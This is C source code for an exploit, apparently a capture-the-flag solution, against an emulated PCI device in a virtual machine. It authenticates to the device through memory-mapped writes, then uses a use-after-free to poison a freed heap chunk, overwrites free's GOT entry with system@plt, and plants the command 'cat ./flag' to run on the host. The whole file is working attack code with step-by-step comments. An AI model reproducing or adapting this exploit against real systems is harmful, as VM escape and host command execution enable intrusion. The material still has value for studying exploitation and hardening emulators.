/*
* author: w0lfzhang
* date: 2018.12.5
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <assert.h>

#define PRINT_ERROR \
	do { \
		fprintf(stderr, "Error at line %d, file %s (%d) [%s]\n", \
		__LINE__, __FILE__, errno, strerror(errno)); exit(1); \
	} while(0)

#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)

int fd = -1;

char *filename = "/sys/devices/pci0000:00/0000:00:04.0/resource0";

void pcimem_write(uint64_t target, char access_type, uint64_t writeval) 
{
	/* Map one page */
	void *map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target & ~MAP_MASK);
	if(map_base == (void *) -1) PRINT_ERROR;
	printf("PCI Memory mapped to address 0x%08lx.\n", (unsigned long) map_base);
	uint64_t read_result = 0;

	int type_width = 0;
	void *virt_addr = map_base + (target & MAP_MASK);

	switch(access_type) 
	{
		case 'b':
			*((uint8_t *) virt_addr) = writeval;
			read_result = *((uint8_t *) virt_addr);
			type_width = 1;
			break;
		case 'h':
			*((uint16_t *) virt_addr) = writeval;
			read_result = *((uint16_t *) virt_addr);
			type_width = 2;
			break;
		case 'w':
			*((uint32_t *) virt_addr) = writeval;
			read_result = *((uint32_t *) virt_addr);
			type_width = 4;
			break;
		case 'd':
			*((uint64_t *) virt_addr) = writeval;
			read_result = *((uint64_t *) virt_addr);
			type_width = 8;
			break;
	}
	//readback not correct?
	printf("Written 0x%0*lX; readback 0x%*lX\n", type_width, writeval, type_width, read_result);
	if(munmap(map_base, MAP_SIZE) == -1) 
		PRINT_ERROR;
}

int main(int argc, char *argv[])
{
	if((fd = open(filename, O_RDWR | O_SYNC)) == -1)
		PRINT_ERROR;

	//first we need to auth
	size_t i;
	pcimem_write(0x10, 'w', 88);
	pcimem_write(0x10, 'w', 110);
	pcimem_write(0x10, 'w', 117);
	pcimem_write(0x10, 'w', 99);
	pcimem_write(0x10, 'w', 97);

	pcimem_write(0x10, 'w', 0);
	
	//the we need to set timer
	pcimem_write(0x20, 'w', 0);

	//then we need to send request to activate the timer.

	//step 1: allocate memory and save it at index 6. I like 6~
	pcimem_write(0x30 | 0x600 | 0x1000 | 0x300000, 'w', 0);
	//trigger timer_func
	usleep(10); //actually, I think it's too long using sleep. we can use usleep.

	//step 2: free the above chunk
	pcimem_write(0x30 | 0x600 | 0x3000, 'w', 0);
	usleep(10);

	//step 3: overwirte the freed chunk's fd
	pcimem_write(0x30 | 0x600 | 0x2000 | 0x000000, 'w', 0x11b92a2);  //near free@got
	usleep(10);
	pcimem_write(0x30 | 0x600 | 0x2000 | 0x040000, 'w', 0);
	usleep(10);

	//step 4: allocate multi chunks to get fake chunk
	for(i = 0; i < 2; i++)
	{
		pcimem_write(0x30 | (i << 8) | 0x1000 | 0x300000, 'w', 0);
		usleep(10);
	}

	//step 5: overwrite free's got(0x11B92C8) as system@plt 
	pcimem_write(0x30 | 0x100 | 0x2000 | 0x160000, 'w', 0x411420);
	pcimem_write(0x30 | 0x100 | 0x2000 | 0x1a0000, 'w', 0);

	//step 6: copy cat ./flag to fake chunk
	pcimem_write(0x30 | 0x100 | 0x2000 | 0x000000, 'w', 0x20746163);
	usleep(10);
	pcimem_write(0x30 | 0x100 | 0x2000 | 0x040000, 'w', 0x6c662f2e);
	usleep(10);
	pcimem_write(0x30 | 0x100 | 0x2000 | 0x080000, 'w', 0x203b6761);
	usleep(10);

	//step 7: trigger free 
	pcimem_write(0x30 | 0x100 | 0x3000, 'w', 0);
	usleep(10);

	return 0;
}